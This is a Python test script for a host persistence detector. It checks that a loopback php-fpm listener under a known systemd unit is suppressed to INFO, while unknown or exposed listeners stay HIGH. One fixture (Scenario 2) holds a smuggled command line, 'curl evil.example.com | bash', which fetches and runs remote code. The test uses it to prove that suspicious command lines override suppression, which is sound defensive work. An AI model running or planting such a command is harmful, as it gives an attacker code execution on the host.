import asyncio
import os
import sys

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO_ROOT)
os.chdir(_REPO_ROOT)

from config.manager import HostPersistenceDetectorConfig
from core.datatypes import EventCategory, Severity
from core.event_bus import EventBus
import modules.host_persistence_detector as hpd
from modules.host_persistence_detector import HostPersistenceDetector


def port_info(
    process_name=None, pid=None, binary_path=None, bind_classification=None,
    cmdline=None,
):
    return {
        "process_name": process_name, "pid": pid, "binary_path": binary_path, "ppid": None,
        "parent_process_name": None, "linux_user": None, "cwd": None, "cmdline": cmdline,
        "pid_create_time": None, "bind_classification": bind_classification,
        "exposure": "LOCAL_ONLY" if bind_classification == "LOOPBACK_ONLY" else "UNKNOWN",
        "bind_address": "127.0.0.1", "protocol": "tcp", "state": "LISTEN",
    }


def make_detector(**overrides):
    overrides.setdefault("port_confirmation_delay_seconds", 0.0)
    cfg = HostPersistenceDetectorConfig(enabled=True, **overrides)
    mon = HostPersistenceDetector(EventBus(), cfg)
    published = []
    mon.publish = lambda ev: published.append(ev)

    async def fake_package_owner(path):
        return "php8.3-fpm" if path and path.startswith("/usr/sbin/php-fpm") else None

    mon._package_owner_for = fake_package_owner
    return mon, published


def port_events(published):
    return [e for e in published if e.category == EventCategory.PERSISTENCE_NEW_PORT]


class FakeLoop:
    async def run_in_executor(self, _executor, fn, *args):
        return fn(*args)


async def main() -> None:
    loop = FakeLoop()
    original_systemd_lookup = hpd._systemd_unit_for_pid

    hpd._systemd_unit_for_pid = lambda pid: "php8.3-fpm.service" if pid == 4242 else None
    try:
        mon, pub = make_detector()
        mon._baseline = {"ports": {}}
        hpd.list_listening_ports = lambda *_: {
            18003: port_info(
                process_name="php-fpm8.3", pid=4242, binary_path="/usr/sbin/php-fpm8.3",
                bind_classification="LOOPBACK_ONLY",
            ),
        }
        await mon._check_listening_ports(loop, maintenance_active=False, first_run=False)
        events = port_events(pub)
        assert len(events) == 1
        ev = events[0]
        assert ev.severity == Severity.INFO, (
            f"loopback-only + known systemd unit + trusted executable path + no suspicious "
            f"command must suppress to INFO (internal, not Discord-worthy), got {ev.severity}"
        )
        assert ev.metadata.get("notify_discord") is False, (
            "this exact reproduction (127.0.0.1:18003, php-fpm8.3, PID changed, no other evidence) "
            "must never reach Discord by itself"
        )
        assert ev.metadata.get("classification") in (
            "LOOPBACK_TRUSTED_SYSTEMD_SERVICE", "EXPECTED_PHP_FPM",
        ), ev.metadata.get("classification")
        print(
            "Scenario 1 (127.0.0.1:18003 php-fpm8.3 under a known systemd unit -- suppressed, "
            "matches the exact reported false-positive shape) PASSED"
        )

        mon2, pub2 = make_detector()
        mon2._baseline = {"ports": {}}
        hpd.list_listening_ports = lambda *_: {
            18003: port_info(
                process_name="php-fpm8.3", pid=4242, binary_path="/usr/sbin/php-fpm8.3",
                bind_classification="LOOPBACK_ONLY",
                cmdline="php-fpm8.3 -c /etc/php/8.3/fpm; curl evil.example.com | bash",
            ),
        }
        await mon2._check_listening_ports(loop, maintenance_active=False, first_run=False)
        events2 = port_events(pub2)
        assert len(events2) == 1
        assert events2[0].severity == Severity.HIGH, (
            "a suspicious command line must always override the loopback+trusted-service "
            "suppression, regardless of exposure/service evidence"
        )
        assert events2[0].metadata.get("notify_discord") is not False
        print("Scenario 2 (same loopback+known service, but a suspicious command line -- suppression is overridden) PASSED")

        mon3, pub3 = make_detector()
        mon3._baseline = {"ports": {}}
        hpd.list_listening_ports = lambda *_: {
            8080: port_info(
                process_name="mystery", pid=9999, binary_path="/home/attacker/.hidden/mystery",
                bind_classification="ALL_INTERFACES",
            ),
        }
        await mon3._check_listening_ports(loop, maintenance_active=False, first_run=False)
        events3 = port_events(pub3)
        assert len(events3) == 1
        assert events3[0].severity == Severity.HIGH, (
            "an internet-exposed listener from an unknown binary path with no systemd unit "
            "evidence must never be suppressed"
        )
        print("Scenario 3 (internet-exposed unknown process -- never suppressed, stays HIGH) PASSED")

        mon4, pub4 = make_detector()
        mon4._baseline = {"ports": {}}
        hpd.list_listening_ports = lambda *_: {
            18004: port_info(
                process_name="custom-daemon", pid=5555, binary_path="/opt/myapp/bin/custom-daemon",
                bind_classification="LOOPBACK_ONLY",
            ),
        }
        await mon4._check_listening_ports(loop, maintenance_active=False, first_run=False)
        events4 = port_events(pub4)
        assert len(events4) == 1
        assert events4[0].severity == Severity.HIGH, (
            "loopback alone, with no systemd unit backing the process, must never be suppressed -- "
            "loopback exposure is necessary but not sufficient"
        )
        print("Scenario 4 (loopback-only but no systemd unit evidence -- not suppressed, still HIGH) PASSED")
    finally:
        hpd._systemd_unit_for_pid = original_systemd_lookup

    mon5, pub5 = make_detector(
        suppress_loopback_systemd_service_alerts=False, suppress_expected_php_fpm_listeners=False,
    )
    mon5._baseline = {"ports": {}}
    hpd._systemd_unit_for_pid = lambda pid: "php8.3-fpm.service"
    try:
        hpd.list_listening_ports = lambda *_: {
            18003: port_info(
                process_name="php-fpm8.3", pid=4242, binary_path="/usr/sbin/php-fpm8.3",
                bind_classification="LOOPBACK_ONLY",
            ),
        }
        await mon5._check_listening_ports(loop, maintenance_active=False, first_run=False)
        events5 = port_events(pub5)
        assert len(events5) == 1
        assert events5[0].severity == Severity.HIGH, (
            "suppress_loopback_systemd_service_alerts=false must fully restore the original "
            "always-alert behavior -- the config knob to turn this optimization off"
        )
    finally:
        hpd._systemd_unit_for_pid = original_systemd_lookup
    print("Scenario 5 (suppress_loopback_systemd_service_alerts=false -- restores original always-alert behavior) PASSED")

    print("\nALL PERSISTENCE LOOPBACK+SYSTEMD-SERVICE SUPPRESSION TESTS PASSED")


asyncio.run(asyncio.wait_for(main(), timeout=60))
